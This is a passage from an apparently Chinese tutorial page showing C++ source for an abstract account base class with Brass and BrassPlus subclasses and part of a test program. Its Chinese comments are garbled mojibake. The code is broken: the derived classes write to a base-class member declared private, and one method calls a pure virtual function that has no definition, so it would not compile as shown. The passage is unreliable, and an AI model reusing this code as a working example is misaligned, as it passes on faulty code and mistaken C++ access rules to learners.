class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ACCTABC_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ACCTABC_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠ½è±¡åŸºç±» AcctABC</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AcctABC</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> fullName;</span><br><span class="line">    <span class="keyword">long</span> acctNum;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line"><span class="keyword">protected</span>: <span class="comment">// æ”¹ä¸º protected ä»¥ä¾¿æ´¾ç”Ÿç±»è®¿é—®</span></span><br><span class="line">    <span class="comment">// è¾…åŠ©æ ¼å¼åŒ–å‡½æ•° (protectedï¼Œæ´¾ç”Ÿç±»å¯ç”¨)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Formatting</span> &#123;</span></span><br><span class="line">        <span class="built_in">std</span>::ios_base::fmtflags flag;</span><br><span class="line">        <span class="built_in">std</span>::streamsize pr;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">FullName</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> fullName; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">AcctNum</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> acctNum; &#125;</span><br><span class="line">    <span class="function">Formatting <span class="title">SetFormat</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Restore</span><span class="params">(Formatting &amp; f)</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•° (ABC ä¹Ÿå¯ä»¥æœ‰æ„é€ å‡½æ•°)</span></span><br><span class="line">    AcctABC(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s = <span class="string">&quot;Nullbody&quot;</span>, <span class="keyword">long</span> an = <span class="number">-1</span>,</span><br><span class="line">            <span class="keyword">double</span> bal = <span class="number">0.0</span>);</span><br><span class="line">    <span class="comment">// å­˜æ¬¾</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Deposit</span><span class="params">(<span class="keyword">double</span> amt)</span></span>;</span><br><span class="line">    <span class="comment">// å–æ¬¾ - è®¾ä¸ºçº¯è™šå‡½æ•°ï¼Œå…·ä½“å®ç°åœ¨æ´¾ç”Ÿç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// æŸ¥è¯¢ä½™é¢</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Balance</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> balance; &#125;</span><br><span class="line">    <span class="comment">// æŸ¥çœ‹è´¦æˆ·ä¿¡æ¯ - è®¾ä¸ºçº¯è™šå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// è™šææ„å‡½æ•° (åŸºç±»æœ‰è™šå‡½æ•°ï¼Œææ„å‡½æ•°ä¹Ÿåº”æ˜¯è™šçš„)</span></span><br><span class="line">    <span class="keyword">virtual</span> ~AcctABC() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…·ä½“çš„æ´¾ç”Ÿç±»: Brass Account (æ”¯ç¥¨è´¦æˆ·)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Brass</span> :</span> <span class="keyword">public</span> AcctABC &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Brass(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s = <span class="string">&quot;Nullbody&quot;</span>, <span class="keyword">long</span> an = <span class="number">-1</span>,</span><br><span class="line">          <span class="keyword">double</span> bal = <span class="number">0.0</span>) : AcctABC(s, an, bal) &#123;&#125;</span><br><span class="line">    <span class="comment">// å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° Withdraw</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° ViewAcct</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// Brass ç±»æ²¡æœ‰æ–°çš„çº¯è™šå‡½æ•°ï¼Œæ‰€ä»¥æ˜¯å…·ä½“ç±»</span></span><br><span class="line">    <span class="keyword">virtual</span> ~Brass() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…·ä½“çš„æ´¾ç”Ÿç±»: BrassPlus Account (å¸¦é€æ”¯ä¿æŠ¤çš„æ”¯ç¥¨è´¦æˆ·)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BrassPlus</span> :</span> <span class="keyword">public</span> AcctABC &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> maxLoan;     <span class="comment">// æœ€å¤§é€æ”¯é¢</span></span><br><span class="line">    <span class="keyword">double</span> rate;        <span class="comment">// é€æ”¯åˆ©ç‡</span></span><br><span class="line">    <span class="keyword">double</span> owesBank;    <span class="comment">// å½“å‰æ¬ æ¬¾</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    BrassPlus(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; s = <span class="string">&quot;Nullbody&quot;</span>, <span class="keyword">long</span> an = <span class="number">-1</span>,</span><br><span class="line">              <span class="keyword">double</span> bal = <span class="number">0.0</span>, <span class="keyword">double</span> ml = <span class="number">500</span>,</span><br><span class="line">              <span class="keyword">double</span> r = <span class="number">0.11125</span>);</span><br><span class="line">    BrassPlus(<span class="keyword">const</span> Brass &amp; ba, <span class="keyword">double</span> ml = <span class="number">500</span>, <span class="keyword">double</span> r = <span class="number">0.11125</span>);</span><br><span class="line">    <span class="comment">// å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° Withdraw</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// å®ç°åŸºç±»çš„çº¯è™šå‡½æ•° ViewAcct</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span></span>;</span><br><span class="line">    <span class="comment">// æ´¾ç”Ÿç±»è‡ªå·±çš„æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetMax</span><span class="params">(<span class="keyword">double</span> m)</span> </span>&#123; maxLoan = m; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRate</span><span class="params">(<span class="keyword">double</span> r)</span> </span>&#123; rate = r; &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetOwes</span><span class="params">()</span> </span>&#123; owesBank = <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~BrassPlus() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// ACCTABC_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>acctabc.cpp (å®ç°)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;acctabc.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::ios_base;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- AcctABC æ–¹æ³•å®ç° ---</span></span><br><span class="line"><span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">AcctABC::AcctABC(<span class="keyword">const</span> <span class="built_in">string</span> &amp; s, <span class="keyword">long</span> an, <span class="keyword">double</span> bal) &#123;</span><br><span class="line">    fullName = s;</span><br><span class="line">    acctNum = an;</span><br><span class="line">    balance = bal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å­˜æ¬¾ (éè™šå‡½æ•°ï¼Œæ‰€æœ‰è´¦æˆ·ç±»å‹é€šç”¨)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AcctABC::Deposit</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amt &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Negative deposit not allowed; &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;deposit is cancelled.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        balance += amt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼šçº¯è™šå‡½æ•° Withdraw() å’Œ ViewAcct() åœ¨åŸºç±»ä¸­æ²¡æœ‰å®ç°ä½“</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾…åŠ©æ ¼å¼åŒ–å‡½æ•°</span></span><br><span class="line"><span class="function">AcctABC::Formatting <span class="title">AcctABC::SetFormat</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Formatting f;</span><br><span class="line">    f.flag = <span class="built_in">cout</span>.setf(ios_base::fixed, ios_base::floatfield); <span class="comment">// use fixed-point</span></span><br><span class="line">    f.pr = <span class="built_in">cout</span>.precision(<span class="number">2</span>); <span class="comment">// for $$$.cc format</span></span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AcctABC::Restore</span><span class="params">(Formatting &amp; f)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>.setf(f.flag, ios_base::floatfield);</span><br><span class="line">    <span class="built_in">cout</span>.precision(f.pr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Brass æ–¹æ³•å®ç° ---</span></span><br><span class="line"><span class="comment">// å®ç°çº¯è™šå‡½æ•° Withdraw</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Brass::Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amt &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Withdrawal amount must be positive; &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;withdrawal canceled.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (amt &lt;= Balance()) &#123; <span class="comment">// ä½¿ç”¨åŸºç±»çš„ Balance() æ–¹æ³•</span></span><br><span class="line">        AcctABC::Withdraw(amt); <span class="comment">// è°ƒç”¨åŸºç±»ç‰ˆæœ¬æ¥æ›´æ–°ä½™é¢ (å¦‚æœåŸºç±»æœ‰å®ç°çš„è¯ï¼Œè¿™é‡Œå‡è®¾åŸºç±»æ²¡å®ç°ï¼Œç›´æ¥ä¿®æ”¹)</span></span><br><span class="line">        balance -= amt;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Withdrawal amount of $&quot;</span> &lt;&lt; amt</span><br><span class="line">             &lt;&lt; <span class="string">&quot; exceeds your balance.\n&quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;Withdrawal canceled.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç°çº¯è™šå‡½æ•° ViewAcct</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Brass::ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Formatting f = SetFormat(); <span class="comment">// ä½¿ç”¨åŸºç±»çš„æ ¼å¼åŒ–è¾…åŠ©å‡½æ•°</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Brass Client: &quot;</span> &lt;&lt; FullName() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨åŸºç±»çš„ protected æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Account Number: &quot;</span> &lt;&lt; AcctNum() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨åŸºç±»çš„ protected æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Balance: $&quot;</span> &lt;&lt; Balance() &lt;&lt; <span class="built_in">endl</span>;     <span class="comment">// ä½¿ç”¨åŸºç±»çš„ public æ–¹æ³•</span></span><br><span class="line">    Restore(f); <span class="comment">// æ¢å¤æ ¼å¼</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- BrassPlus æ–¹æ³•å®ç° ---</span></span><br><span class="line">BrassPlus::BrassPlus(<span class="keyword">const</span> <span class="built_in">string</span> &amp; s, <span class="keyword">long</span> an, <span class="keyword">double</span> bal,</span><br><span class="line">                     <span class="keyword">double</span> ml, <span class="keyword">double</span> r) : AcctABC(s, an, bal) &#123;</span><br><span class="line">    maxLoan = ml;</span><br><span class="line">    owesBank = <span class="number">0.0</span>;</span><br><span class="line">    rate = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BrassPlus::BrassPlus(<span class="keyword">const</span> Brass &amp; ba, <span class="keyword">double</span> ml, <span class="keyword">double</span> r)</span><br><span class="line">           : AcctABC(ba) &#123; <span class="comment">// ä½¿ç”¨ AcctABC çš„éšå¼å¤åˆ¶æ„é€ å‡½æ•° (å¦‚æœå­˜åœ¨ä¸”å¯ç”¨)</span></span><br><span class="line">                           <span class="comment">// æˆ–è€…æ˜¾å¼è°ƒç”¨ AcctABC(ba.FullName(), ba.AcctNum(), ba.Balance())</span></span><br><span class="line">                           <span class="comment">// (éœ€è¦ ba æä¾›è®¿é—®å™¨æˆ– AcctABC æˆå‘˜æ˜¯ protected)</span></span><br><span class="line">    maxLoan = ml;</span><br><span class="line">    owesBank = <span class="number">0.0</span>;</span><br><span class="line">    rate = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç°çº¯è™šå‡½æ•° ViewAcct</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BrassPlus::ViewAcct</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    Formatting f = SetFormat();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BrassPlus Client: &quot;</span> &lt;&lt; FullName() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Account Number: &quot;</span> &lt;&lt; AcctNum() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Balance: $&quot;</span> &lt;&lt; Balance() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum loan: $&quot;</span> &lt;&lt; maxLoan &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Owed to bank: $&quot;</span> &lt;&lt; owesBank &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loan Rate: &quot;</span> &lt;&lt; <span class="number">100</span> * rate &lt;&lt; <span class="string">&quot;%\n&quot;</span>;</span><br><span class="line">    Restore(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç°çº¯è™šå‡½æ•° Withdraw</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BrassPlus::Withdraw</span><span class="params">(<span class="keyword">double</span> amt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amt &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Withdrawal amount must be positive; &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;withdrawal canceled.\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Formatting f = SetFormat();</span><br><span class="line">    <span class="keyword">double</span> bal = Balance(); <span class="comment">// è·å–å½“å‰ä½™é¢</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (amt &lt;= bal) &#123; <span class="comment">// å¦‚æœä½™é¢è¶³å¤Ÿ</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨åŸºç±»çš„ Withdraw (å¦‚æœå®ƒä¿®æ”¹ä½™é¢) æˆ–ç›´æ¥ä¿®æ”¹</span></span><br><span class="line">        <span class="comment">// å‡è®¾ balance æ˜¯ protected:</span></span><br><span class="line">        balance -= amt;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (amt &lt;= bal + maxLoan - owesBank) &#123; <span class="comment">// å¦‚æœä½™é¢+å‰©ä½™å¯é€æ”¯é¢åº¦è¶³å¤Ÿ</span></span><br><span class="line">        <span class="keyword">double</span> advance = amt - bal; <span class="comment">// éœ€è¦é€æ”¯çš„é‡‘é¢</span></span><br><span class="line">        owesBank += advance * (<span class="number">1.0</span> + rate); <span class="comment">// è®¡ç®—æ¬ æ¬¾ (åŠ ä¸Šåˆ©æ¯)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bank advance: $&quot;</span> &lt;&lt; advance &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Finance charge: $&quot;</span> &lt;&lt; advance * rate &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        Deposit(advance); <span class="comment">// å…ˆå­˜å…¥é€æ”¯é¢åº¦ (å¢åŠ ä½™é¢)</span></span><br><span class="line">        <span class="comment">// å†å–æ¬¾ (ä¿®æ”¹ä½™é¢)</span></span><br><span class="line">        <span class="comment">// å‡è®¾ balance æ˜¯ protected:</span></span><br><span class="line">        balance -= amt;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Credit limit exceeded. Transaction cancelled.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Restore(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ç¤ºä¾‹ (usebrass1.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;acctabc.h&quot;</span> <span class="comment">// åŒ…å« ABC å’Œæ´¾ç”Ÿç±»</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> CLIENTS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// AcctABC anAccount; // é”™è¯¯ï¼ä¸èƒ½åˆ›å»ºæŠ½è±¡åŸºç±»å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    AcctABC * p_clients[CLIENTS]; <span class="comment">// å¯ä»¥åˆ›å»ºæŒ‡å‘ ABC çš„æŒ‡é’ˆæ•°ç»„</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> temp;</span><br><span class="line">    <span class="keyword">long</span> tempnum;</span><br><span class="line">    <span class="keyword">double</span> tempbal;</span><br><span class="line">    <span class="keyword">char</span> kind;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTS; i++) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter client&#x27;s name: &quot;</span>;</span><br><span class="line">        getline(<span class="built_in">cin</span>, temp);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter client&#x27;s account number: &quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; tempnum;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter opening balance: $&quot;</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; tempbal;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter 1 for Brass Account or &quot;</span></span><br><span class="line">             &lt;&lt; <span class="string">&quot;2 for BrassPlus Account: &quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; kind &amp;&amp; (kind != <span class="string">&#x27;1&#x27;</span> &amp;&amp; kind != <span class="string">&#x27;2&#x27;</span>))</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter either 1 or 2: &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (kind == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            p_clients[i] = <span class="keyword">new</span> Brass(temp, tempnum, tempbal);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">double</span> tmax, trate;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the overdraft limit: $&quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; tmax;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the interest rate &quot;</span></span><br><span class="line">                 &lt;&lt; <span class="string">&quot;as a decimal fraction: &quot;</span>;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; trate;</span><br><span class="line">            p_clients[i] = <span class="keyword">new</span> BrassPlus(temp, tempnum, tempbal, tmax, trate);</span><br><span class="line">        &#125;</span><br><span class="line">        